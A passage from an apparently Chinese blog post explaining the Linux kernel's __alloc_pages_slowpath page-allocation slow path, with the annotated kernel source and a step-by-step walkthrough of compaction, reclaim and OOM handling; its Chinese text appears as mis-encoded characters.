class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *</span></span><br><span class="line"><span class="class">__<span class="title">alloc_pages_slowpath</span>(<span class="title">gfp_t</span> <span class="title">gfp_mask</span>, <span class="title">unsigned</span> <span class="title">int</span> <span class="title">order</span>,</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">alloc_context</span> *<span class="title">ac</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="type">bool</span> can_direct_reclaim = gfp_mask &amp; __GFP_DIRECT_RECLAIM;</span><br><span class="line"><span class="type">const</span> <span class="type">bool</span> costly_order = order &gt; PAGE_ALLOC_COSTLY_ORDER;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> alloc_flags;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> did_some_progress;</span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">compact_priority</span> <span class="title">compact_priority</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">compact_result</span> <span class="title">compact_result</span>;</span></span><br><span class="line"><span class="type">int</span> compaction_retries;</span><br><span class="line"><span class="type">int</span> no_progress_loops;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> cpuset_mems_cookie;</span><br><span class="line"><span class="type">int</span> reserve_flags;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * æˆ‘ä»¬è¿˜è¿›è¡Œäº†å¥å…¨æ€§æ£€æŸ¥ï¼Œä»¥å‘ç°éåŸå­ä¸Šä¸‹æ–‡ä¸­çš„ caller æ»¥ç”¨åŸå­å‚¨å¤‡ï¼ˆçš„è¡Œä¸ºï¼‰ã€‚</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (WARN_ON_ONCE((gfp_mask &amp; (__GFP_ATOMIC|__GFP_DIRECT_RECLAIM)) ==</span><br><span class="line">(__GFP_ATOMIC|__GFP_DIRECT_RECLAIM)))</span><br><span class="line">gfp_mask &amp;= ~__GFP_ATOMIC;</span><br><span class="line"></span><br><span class="line">retry_cpuset:</span><br><span class="line">compaction_retries = <span class="number">0</span>;</span><br><span class="line">no_progress_loops = <span class="number">0</span>;</span><br><span class="line">compact_priority = DEF_COMPACT_PRIORITY;</span><br><span class="line">cpuset_mems_cookie = read_mems_allowed_begin();</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * ä»…åœ¨ kswapd éœ€è¦è¢«å”¤é†’å‰ï¼Œå¿«é€Ÿè·¯å¾„ä½¿ç”¨ä¿å®ˆçš„ alloc_flags æ‰èƒ½æˆåŠŸï¼Œ</span></span><br><span class="line"><span class="comment"> * å¹¶ä¸”é¿å…ç²¾ç¡®åœ°è®¾ç½® alloc_flagsã€‚ æ‰€ä»¥æˆ‘ä»¬ç°åœ¨è¿™ä¹ˆåšã€‚</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="comment">// é‡æ–°è®¾ç½® alloc_flagsï¼Œå› ä¸ºå¿«é€Ÿè·¯å¾„çš„åˆ†é…åœ¨ kswapd è¢«å”¤é†’ä¹‹å‰</span></span><br><span class="line">    <span class="comment">// åªæœ‰ä½¿ç”¨ä¿å®ˆçš„ alloc_flags æ‰èƒ½æˆåŠŸï¼Œè€Œç°åœ¨æˆ‘ä»¬å°†å”¤é†’ kswapdï¼Œ</span></span><br><span class="line">    <span class="comment">// å› æ­¤æ¢å¤ä½¿ç”¨åŸæœ‰çš„ gfp_mask å¯¹åº”çš„ alloc_flags</span></span><br><span class="line">alloc_flags = gfp_to_alloc_flags(gfp_mask);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * æˆ‘ä»¬éœ€è¦ä¸º zonelist è¿­ä»£å™¨é‡æ–°è®¡ç®—èµ·å§‹ç‚¹ï¼Œå› ä¸ºæˆ‘ä»¬å¯èƒ½åœ¨å¿«é€Ÿè·¯å¾„ä¸­</span></span><br><span class="line"><span class="comment"> * ä½¿ç”¨äº†ä¸åŒçš„ nodemask ï¼Œæˆ–æ˜¯æœ‰ä¸ª cpuset çš„ä¿®æ”¹è€Œæˆ‘ä»¬æ­£åœ¨é‡è¯•</span></span><br><span class="line"><span class="comment"> * - å¦åˆ™æˆ‘ä»¬å¯èƒ½ä¼šæ— ä¼‘æ­¢åœ°è¿­ä»£ä¸åˆæ ¼çš„ zone</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">ac-&gt;preferred_zoneref = first_zones_zonelist(ac-&gt;zonelist,</span><br><span class="line">ac-&gt;highest_zoneidx, ac-&gt;nodemask);</span><br><span class="line"><span class="keyword">if</span> (!ac-&gt;preferred_zoneref-&gt;zone)</span><br><span class="line"><span class="keyword">goto</span> nopage;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å¦‚æœ ALLOC_KSWAPDï¼Œå”¤é†’ kswapd çº¿ç¨‹å›æ”¶å†…å­˜</span></span><br><span class="line"><span class="keyword">if</span> (alloc_flags &amp; ALLOC_KSWAPD)</span><br><span class="line">wake_all_kswapds(order, gfp_mask, ac);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * è°ƒæ•´åçš„ alloc_flags å¯èƒ½ä¼šç«‹å³æˆåŠŸï¼Œæ‰€ä»¥å…ˆè¿›è¡Œå°è¯•</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">page = get_page_from_freelist(gfp_mask, order, alloc_flags, ac);</span><br><span class="line"><span class="keyword">if</span> (page)</span><br><span class="line"><span class="keyword">goto</span> got_pg;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * å¯¹äºä»£ä»·é«˜çš„åˆ†é…, é¦–å…ˆå°è¯•ç›´æ¥çš„ compactionï¼ˆè¯‘æ³¨ï¼šç¢ç‰‡æ•´ç†æœºåˆ¶ï¼‰,</span></span><br><span class="line"><span class="comment"> * å› ä¸ºæœ‰å¯èƒ½æˆ‘ä»¬ä»æœ‰è¶³å¤Ÿçš„åŸºæœ¬é¡µé¢ï¼Œå¹¶ä¸éœ€è¦å»å›æ”¶. å¯¹äºä¸å¯è¿ç§»çš„é«˜é˜¶åˆ†é…ï¼Œ</span></span><br><span class="line"><span class="comment"> * åŒæ ·è¿™ä¹ˆåš, å› ä¸º compaction å°†å°è¯•é€šè¿‡ä»ç›¸åŒè¿ç§»ç±»å‹çš„å—è¿›è¡Œè¿ç§»</span></span><br><span class="line"><span class="comment"> * ä»¥é¿å…æ°¸ä¹…çš„ç¢ç‰‡. åˆ«å¯¹å…è®¸å¿½è§†æ°´ä½çº¿çš„åˆ†é…å°è¯•è¿™ä¸ªï¼Œå› ä¸º</span></span><br><span class="line"><span class="comment"> * ALLOC_NO_WATERMARKS è¿˜æ²¡å‘ç”Ÿã€‚</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (can_direct_reclaim &amp;&amp;</span><br><span class="line">(costly_order ||</span><br><span class="line">   (order &gt; <span class="number">0</span> &amp;&amp; ac-&gt;migratetype != MIGRATE_MOVABLE))</span><br><span class="line">&amp;&amp; !gfp_pfmemalloc_allowed(gfp_mask)) &#123;</span><br><span class="line">page = __alloc_pages_direct_compact(gfp_mask, order,</span><br><span class="line">alloc_flags, ac,</span><br><span class="line">INIT_COMPACT_PRIORITY,</span><br><span class="line">&amp;compact_result);</span><br><span class="line"><span class="keyword">if</span> (page)</span><br><span class="line"><span class="keyword">goto</span> got_pg;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * æ£€æŸ¥å¸¦æœ‰ __GFP_NORETRY çš„ä»£ä»·é«˜çš„åˆ†é…, å…¶</span></span><br><span class="line"><span class="comment"> * åŒ…æ‹¬ä¸€äº› THP page fault çš„åˆ†é…</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (costly_order &amp;&amp; (gfp_mask &amp; __GFP_NORETRY)) &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * è‹¥åˆ†é…æ•´ä¸ª pageblock(s) ä¸” compaction ç”±äºæ‰€æœ‰çš„ zone</span></span><br><span class="line"><span class="comment"> * éƒ½åœ¨æ°´ä½çº¿ä¸‹å¤±è´¥äº†ï¼Œæˆ–æ˜¯è¢«ç¦æ­¢äº†å› ä¸ºå…¶æœ€è¿‘åœ¨è¯¥orderä¸Šå¤±è´¥äº†ï¼Œ</span></span><br><span class="line"><span class="comment"> * é™¤éåˆ†é…å™¨æœ‰è¯·æ±‚çš„ compaction ä¸å›æ”¶å°è¯•ï¼Œå¦åˆ™ç›´æ¥å¤±è´¥</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * å›æ”¶æ˜¯ï¼š</span></span><br><span class="line"><span class="comment"> *  - å¯èƒ½éå¸¸æ˜‚è´µå› ä¸º zones å¯èƒ½è¿œä½äºä»–ä»¬çš„ä½æ°´ä½çº¿ï¼Œ</span></span><br><span class="line"><span class="comment"> *    æˆ–æ˜¯è¿™æ˜¯éå¸¸çªå‘çš„é«˜é˜¶åˆ†é…çš„ä¸€éƒ¨åˆ†,</span></span><br><span class="line"><span class="comment"> *  - ä¸ä¸€å®šä¼šæœ‰å¸®åŠ©å› ä¸º isolate_freepages() å¯èƒ½ä¸ä¼šåœ¨</span></span><br><span class="line"><span class="comment"> *    è¢«é‡Šæ”¾çš„é¡µé¢ä¸Šè¿­ä»£ä½œä¸ºå…¶çº¿æ€§æ‰«æçš„ä¸€éƒ¨åˆ†ï¼Œä¸”</span></span><br><span class="line"><span class="comment"> *  - ä¸å¤§å¯èƒ½ä¼šè®©æ•´ä¸ª pageblocks è‡ªå·±é‡Šæ”¾</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (compact_result == COMPACT_SKIPPED ||</span><br><span class="line">    compact_result == COMPACT_DEFERRED)</span><br><span class="line"><span class="keyword">goto</span> nopage;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * çœ‹èµ·æ¥å¥½åƒ reclaim/compaction æ˜¯å€¼å¾—å°è¯•çš„, ä½†</span></span><br><span class="line"><span class="comment"> * åŒæ­¥çš„ compaction å¯èƒ½ä¼šéå¸¸ expensive, æ•…ä¿æŒ</span></span><br><span class="line"><span class="comment"> * ä½¿ç”¨å¼‚æ­¥çš„ compaction.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">compact_priority = INIT_COMPACT_PRIORITY;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">retry:</span><br><span class="line"><span class="comment">/* ç¡®ä¿åªè¦æˆ‘ä»¬å¾ªç¯ï¼Œ kswapd ä¾¿ä¸ä¼šæ„å¤–åœ°ä¼‘çœ  */</span></span><br><span class="line"><span class="keyword">if</span> (alloc_flags &amp; ALLOC_KSWAPD)</span><br><span class="line">wake_all_kswapds(order, gfp_mask, ac);</span><br><span class="line"></span><br><span class="line">reserve_flags = __gfp_pfmemalloc_flags(gfp_mask);</span><br><span class="line"><span class="keyword">if</span> (reserve_flags)</span><br><span class="line">alloc_flags = current_alloc_flags(gfp_mask, reserve_flags);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * è‹¥å†…å­˜ç­–ç•¥å¯ä»¥å¿½ç•¥ï¼Œé‡ç½® nodemask ä¸ zonelist è¿­ä»£å™¨ã€‚</span></span><br><span class="line"><span class="comment"> * è¿™äº›åˆ†é…å…·æœ‰é«˜ä¼˜å…ˆçº§ä¸ç³»ç»Ÿæ€§ï¼Œè€Œéç”¨æˆ·å¯¼å‘ã€‚</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (!(alloc_flags &amp; ALLOC_CPUSET) || reserve_flags) &#123;</span><br><span class="line">ac-&gt;nodemask = <span class="literal">NULL</span>;</span><br><span class="line">ac-&gt;preferred_zoneref = first_zones_zonelist(ac-&gt;zonelist,</span><br><span class="line">ac-&gt;highest_zoneidx, ac-&gt;nodemask);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* å¸¦ç€å¯èƒ½è°ƒæ•´è¿‡ zonelist ä¸ alloc_flags å†æ¬¡å°è¯• */</span></span><br><span class="line">page = get_page_from_freelist(gfp_mask, order, alloc_flags, ac);</span><br><span class="line"><span class="keyword">if</span> (page)</span><br><span class="line"><span class="keyword">goto</span> got_pg;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* è°ƒç”¨æ–¹ä¸æƒ³è¦å›æ”¶, æˆ‘ä»¬æ— æ³•å¹³è¡¡ä»»ä½•äº‹ */</span></span><br><span class="line"><span class="keyword">if</span> (!can_direct_reclaim)</span><br><span class="line"><span class="keyword">goto</span> nopage;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* é¿å…é€’å½’åœ°ç›´æ¥å›æ”¶ */</span></span><br><span class="line"><span class="keyword">if</span> (current-&gt;flags &amp; PF_MEMALLOC)</span><br><span class="line"><span class="keyword">goto</span> nopage;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* å°è¯•ç›´æ¥å›æ”¶ååˆ†é… */</span></span><br><span class="line">page = __alloc_pages_direct_reclaim(gfp_mask, order, alloc_flags, ac,</span><br><span class="line">&amp;did_some_progress);</span><br><span class="line"><span class="keyword">if</span> (page)</span><br><span class="line"><span class="keyword">goto</span> got_pg;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* å°è¯•ç›´æ¥ compaction ååˆ†é… */</span></span><br><span class="line">page = __alloc_pages_direct_compact(gfp_mask, order, alloc_flags, ac,</span><br><span class="line">compact_priority, &amp;compact_result);</span><br><span class="line"><span class="keyword">if</span> (page)</span><br><span class="line"><span class="keyword">goto</span> got_pg;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* è‹¥æ˜¯ç‰¹åˆ«æŒ‡å®šçš„è¯·æ±‚ï¼Œä¸è¦å¾ªç¯ */</span></span><br><span class="line"><span class="keyword">if</span> (gfp_mask &amp; __GFP_NORETRY)</span><br><span class="line"><span class="keyword">goto</span> nopage;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * ä¸è¦é‡è¯•é«˜èŠ±é”€çš„é«˜é˜¶åˆ†é…é™¤éä»–ä»¬æ˜¯</span></span><br><span class="line"><span class="comment"> * __GFP_RETRY_MAYFAIL</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (costly_order &amp;&amp; !(gfp_mask &amp; __GFP_RETRY_MAYFAIL))</span><br><span class="line"><span class="keyword">goto</span> nopage;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (should_reclaim_retry(gfp_mask, order, ac, alloc_flags,</span><br><span class="line"> did_some_progress &gt; <span class="number">0</span>, &amp;no_progress_loops))</span><br><span class="line"><span class="keyword">goto</span> retry;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * è‹¥0é˜¶çš„å›æ”¶æ— æ³•å–å¾—ä»»ä½•è¿›å±•ï¼Œåˆ™é‡è¯• compaction æ²¡æœ‰ä»»ä½•æ„ä¹‰ï¼Œ</span></span><br><span class="line"><span class="comment"> * å› ä¸ºå½“å‰å¯¹ compaction çš„å®ç°æ˜¯åŸºäºæœ‰è¶³å¤Ÿçš„ç©ºé—²å†…å­˜çš„</span></span><br><span class="line"><span class="comment"> *  (å‚è§ __compaction_suitable)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (did_some_progress &gt; <span class="number">0</span> &amp;&amp;</span><br><span class="line">should_compact_retry(ac, order, alloc_flags,</span><br><span class="line">compact_result, &amp;compact_priority,</span><br><span class="line">&amp;compaction_retries))</span><br><span class="line"><span class="keyword">goto</span> retry;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* åœ¨æˆ‘ä»¬å¼€å§‹ OOM killing ä¹‹å‰å¤„ç†å¯èƒ½çš„ cpuset æ›´æ–°ç«äº‰ */</span></span><br><span class="line"><span class="keyword">if</span> (check_retry_cpuset(cpuset_mems_cookie, ac))</span><br><span class="line"><span class="keyword">goto</span> retry_cpuset;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* å›æ”¶å¤±è´¥äº†, å¼€å§‹ killing ä¸€äº›ä¸œè¥¿ */</span></span><br><span class="line">    <span class="comment">// è¦æ€ä¸€äº›è¿›ç¨‹æˆ–æ˜¯åˆ«çš„ä¸œè¥¿æ¥è…¾å†…å­˜äº†</span></span><br><span class="line">page = __alloc_pages_may_oom(gfp_mask, order, ac, &amp;did_some_progress);</span><br><span class="line"><span class="keyword">if</span> (page)</span><br><span class="line"><span class="keyword">goto</span> got_pg;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* åœ¨æ— å°½çš„å¾ªç¯ä¸­é¿å…æ²¡æœ‰æ°´ä½çº¿çš„åˆ†é… */</span></span><br><span class="line"><span class="keyword">if</span> (tsk_is_oom_victim(current) &amp;&amp;</span><br><span class="line">    (alloc_flags &amp; ALLOC_OOM ||</span><br><span class="line">     (gfp_mask &amp; __GFP_NOMEMALLOC)))</span><br><span class="line"><span class="keyword">goto</span> nopage;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* è‹¥ OOM killer å–å¾—äº†ä¸€äº›æˆæ•ˆï¼Œé‡è¯• */</span></span><br><span class="line"><span class="keyword">if</span> (did_some_progress) &#123;</span><br><span class="line">no_progress_loops = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">goto</span> retry;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">nopage:</span><br><span class="line"><span class="comment">/* åœ¨æˆ‘ä»¬å¤±è´¥ä¹‹å‰å¤„ç†å¯èƒ½çš„ cpuset çš„æ›´æ–°ç«äº‰ */</span></span><br><span class="line"><span class="keyword">if</span> (check_retry_cpuset(cpuset_mems_cookie, ac))</span><br><span class="line"><span class="keyword">goto</span> retry_cpuset;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * ç¡®ä¿ __GFP_NOFAIL è¯·æ±‚æ²¡æœ‰æ³„éœ²ä¸”ç¡®ä¿æˆ‘ä»¬ä¸€ç›´åœ¨é‡è¯•</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (gfp_mask &amp; __GFP_NOFAIL) &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * æ‰€æœ‰å­˜åœ¨çš„ __GFP_NOFAIL ç”¨æˆ·éƒ½æ˜¯å¯ä»¥è¢«é˜»å¡çš„, </span></span><br><span class="line"><span class="comment"> * æ•…å¯¹ä»»ä½•æ–°çš„å®é™…ä¸Šéœ€è¦ GFP_NOWAIT çš„ç”¨æˆ·è¿›è¡Œè­¦å‘Š</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (WARN_ON_ONCE(!can_direct_reclaim))</span><br><span class="line"><span class="keyword">goto</span> fail;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * è¿™ä¸ªä¸Šä¸‹æ–‡çš„ PF_MEMALLOC è¯·æ±‚éå¸¸å¥‡æ€ª</span></span><br><span class="line"><span class="comment"> * å› ä¸ºæˆ‘ä»¬ä¸èƒ½å›æ”¶ä»»ä½•ä¸œè¥¿åªèƒ½å¾ªç¯ç­‰å¾…</span></span><br><span class="line"><span class="comment"> * æŸäººæ¥ä¸ºæˆ‘ä»¬åšäº›ä»€ä¹ˆ</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">WARN_ON_ONCE(current-&gt;flags &amp; PF_MEMALLOC);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * æ— å¤±è´¥çš„é«˜å¼€é”€çš„ orders æ˜¯ä¸€é¡¹è‰°å·¨çš„è¦æ±‚ï¼Œ</span></span><br><span class="line"><span class="comment"> * æˆ‘ä»¬å¯¹æ­¤å¹¶æ²¡æœ‰å¤ªå¤šå‡†å¤‡ï¼Œæ•…è®©æˆ‘ä»¬è­¦å‘Šè¿™äº›ç”¨æˆ·</span></span><br><span class="line"><span class="comment"> * ä»¥ä¾¿äºæˆ‘ä»¬èƒ½å¤Ÿè¯†åˆ«å‡ºä»–ä»¬å¹¶å°†ä¹‹è½¬åŒ–ä¸ºåˆ«çš„ä¸œè¥¿</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">WARN_ON_ONCE(order &gt; PAGE_ALLOC_COSTLY_ORDER);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * é€šè¿‡è®©ä»–ä»¬èƒ½è®¿é—®ä¿ç•™çš„å†…å­˜æ¥å¸®åŠ©éå¤±è´¥çš„åˆ†é…</span></span><br><span class="line"><span class="comment"> * ä½†ä¸ä½¿ç”¨ ALLOC_NO_WATERMARKS å› ä¸ºè¿™å¯èƒ½</span></span><br><span class="line"><span class="comment"> * å¤§é‡å‡å°‘å†…å­˜ä¿ç•™åŒºè€Œè®©æƒ…å†µæ›´å</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">page = __alloc_pages_cpuset_fallback(gfp_mask, order, ALLOC_HARDER, ac);</span><br><span class="line"><span class="keyword">if</span> (page)</span><br><span class="line"><span class="keyword">goto</span> got_pg;</span><br><span class="line"></span><br><span class="line">cond_resched();</span><br><span class="line"><span class="keyword">goto</span> retry;</span><br><span class="line">&#125;</span><br><span class="line">fail:</span><br><span class="line">warn_alloc(gfp_mask, ac-&gt;nodemask,</span><br><span class="line"><span class="string">&quot;page allocation failure: order:%u&quot;</span>, order);</span><br><span class="line">got_pg:</span><br><span class="line"><span class="keyword">return</span> page;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬å…ˆè¡¥å……ä¸€ä¸ªæ¦‚å¿µâ€”â€”<code>Memory compaction</code> æœºåˆ¶ï¼Œå…¶å®å°±æ˜¯æ•´ç†å†…å­˜ç¢ç‰‡ï¼Œå¯¹é›¶æ•£çš„å†…å­˜é¡µè¿›è¡Œè¿ç§»ï¼Œä»è€Œå°†é›¶æ•£çš„ç©ºé—²å†…å­˜é¡µå˜æˆå¤§å—çš„ç©ºé—²å†…å­˜ï¼Œä¸è¿‡è¿™é‡Œåªæ•´ç†å¯ä»¥ç§»åŠ¨çš„ç¢ç‰‡ï¼š</p><p><img src="https://i.loli.net/2021/11/30/q7T6EjtIb9PVFY3.png" alt="ä»çŸ¥ä¹å·çš„å›¾.png"></p><p>ç°åœ¨æˆ‘ä»¬æ¥çœ‹æ…¢é€Ÿåˆ†é…çš„æ•´ä¸ªæµç¨‹ï¼š</p><ul><li>ä½¿ç”¨åŸæœ‰çš„ gfp_flag é‡æ–°è®¾ç½® alloc_flagï¼Œå¹¶é‡æ–°è®¡ç®— preferred zoneï¼Œè‹¥è®¾ç½®äº† <code>ALLOC_KSWAPD</code> åˆ™è°ƒç”¨ <code>wake_all_kswapds()</code> å”¤é†’ kswapd çº¿ç¨‹è¿›è¡Œå†…å­˜å›æ”¶</li><li>ä¹‹åé‡æ–°å°è¯•å¿«é€Ÿè·¯å¾„çš„åˆ†é…ï¼Œè‹¥æˆåŠŸåˆ™ç›´æ¥è¿”å›</li><li>æ¥ä¸‹æ¥è°ƒç”¨ <code>__alloc_pages_direct_compact()</code> è¿›è¡Œ compactionï¼Œè¯¥å‡½æ•°å†…éƒ¨åœ¨æ•´ç†å®Œåä¼šé‡æ–°å°è¯•å¿«é€Ÿè·¯å¾„çš„åˆ†é…ï¼Œè‹¥æˆåŠŸåˆ™ç›´æ¥è¿”å›</li><li>ï¼ˆretryï¼‰æ¥ä¸‹æ¥è°ƒç”¨ <code>wake_all_kswapds()</code> å”¤é†’ kswapd çº¿ç¨‹è¿›è¡Œå†…å­˜å›æ”¶</li><li>è°ƒæ•´ zonelist ä¸ alloc_flagï¼Œä¹‹åå†æ¬¡å°è¯•å¿«é€Ÿè·¯å¾„åˆ†é…ï¼Œè‹¥æˆåŠŸåˆ™ç›´æ¥è¿”å›</li><li>è‹¥ gfp_flag ä¸­æ²¡æœ‰ <code>__GFP_DIRECT_RECLAIM</code> æˆ–æ˜¯è¿›ç¨‹ PCB çš„ flag ä¸­æœ‰ <code>PF_MEMALLOC</code>ï¼Œç›´æ¥è·³è½¬åˆ° ï¼ˆnopageï¼‰</li><li>è°ƒç”¨ <code>__alloc_pages_direct_reclaim()</code> è¿›è¡Œå†…å­˜å›æ”¶ï¼ˆå†…éƒ¨è°ƒç”¨ <code>__perform_reclaim()</code>ï¼‰ä¸å¿«é€Ÿè·¯å¾„åˆ†é…ï¼Œè‹¥æˆåŠŸåˆ™ç›´æ¥è¿”å›</li><li>è°ƒç”¨ <code>__alloc_pages_direct_compact()</code> è¿›è¡Œ compaction ä¸å¿«é€Ÿè·¯å¾„åˆ†é…ï¼Œè‹¥æˆåŠŸåˆ™ç›´æ¥è¿”å›</li><li>å¦‚æœè®¾ç½®äº† <code>__GFP_NORETRY</code> ï¼Œæˆ–æ˜¯è¯¥æ¬¡å†…å­˜åˆ†é…å¼€é”€è¾ƒé«˜ï¼ˆ<code>order &gt; PAGE_ALLOC_COSTLY_ORDER</code>ï¼‰ä¸”æœªè®¾ç½® <code>__GFP_RETRY_MAYFAIL</code>ï¼Œç›´æ¥è·³åˆ° ï¼ˆnopageï¼‰</li><li>è°ƒç”¨ <code>should_reclaim_retry()</code> åˆ¤æ–­æ˜¯å¦éœ€è¦é‡æ–°å›æ”¶ï¼Œè‹¥æ˜¯åˆ™è·³å›ï¼ˆretryï¼‰</li><li>è°ƒç”¨ <code>should_compact_retry()</code> åˆ¤æ–­æ˜¯å¦éœ€è¦é‡æ–°è¿›è¡Œ compactionï¼Œè‹¥æ˜¯åˆ™è·³å›ï¼ˆretryï¼‰</li><li>è°ƒç”¨ <code>check_retry_cpuset()</code> æ£€æŸ¥ cpuset æ˜¯å¦å‘ç”Ÿå˜åŒ–ï¼Œè‹¥æ˜¯åˆ™è·³è½¬å›å¼€å¤´</li><li>è°ƒç”¨ <code>__alloc_pages_may_oom()</code> å°è¯• kill ä¸€äº›è¿›ç¨‹æ¥é‡Šæ”¾å†…å­˜ï¼Œè¯¥å‡½æ•°å†…é¦–å…ˆè¿˜æ˜¯ä¼šå…ˆè¿›è¡Œä¸€æ¬¡å¿«é€Ÿåˆ†é…ï¼Œä¹‹åæ‰æ˜¯è°ƒç”¨ <code>out_of_memory()</code> æ¥æ€æ‰æœ€é€‚åˆçš„è¿›ç¨‹ä»¥é‡Šæ”¾å†…å­˜ï¼Œæœ€åè‹¥è®¾ç½®äº† <code>__GFP_NOFAIL</code> åˆ™è°ƒç”¨ <code>__alloc_pages_cpuset_fallback()</code> å†æ¬¡å°è¯•å†…å­˜åˆ†é…ï¼Œåœ¨è¯¥å‡½æ•°ä¸­ä¼šä¸¤æ¬¡èµ°å¿«é€Ÿè·¯å¾„è¿›è¡Œåˆ†é…ï¼ˆç¬¬ä¸€æ¬¡ä¼šé¢å¤–é™„åŠ ä¸Š <code>ALLOC_CPUSET</code> çš„ flagï¼‰</li><li>å¦‚æœæŠŠå½“å‰è¿›ç¨‹æ€æ‰äº†ï¼Œè·³åˆ°ï¼ˆnopageï¼‰ï¼›å¦‚æœæ€è¿›ç¨‹å–å¾—äº†æˆæ•ˆï¼Œè·³å›ï¼ˆretryï¼‰</li><li>ï¼ˆnopageï¼‰è°ƒç”¨ <code>check_retry_cpuset()</code> æ£€æŸ¥ cpuset æ˜¯å¦å‘ç”Ÿå˜åŒ–ï¼Œè‹¥æ˜¯åˆ™è·³è½¬å›å¼€å¤´</li><li>è‹¥è®¾ç½®äº† <code>__GFP_NOFAIL</code> 